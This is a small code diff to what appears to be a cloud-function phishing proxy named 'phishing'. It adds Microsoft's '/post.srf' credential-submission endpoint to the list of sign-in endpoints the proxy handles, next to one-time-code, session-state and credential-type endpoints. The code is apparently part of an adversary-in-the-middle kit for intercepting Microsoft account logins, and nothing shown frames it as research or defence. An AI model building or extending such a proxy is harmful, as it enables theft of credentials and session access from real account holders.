@@ -126,6 +126,7 @@ app.http("phishing", {
       '/GetOneTimeCode.srf',
       '/GetSessionState.srf',
       '/GetCredentialType.srf',
+      '/post.srf',
       // Additional endpoints for personal accounts
       '/GetCredentialTypeAsyncEx.srf',
       '/GetAccountInformation.srf',
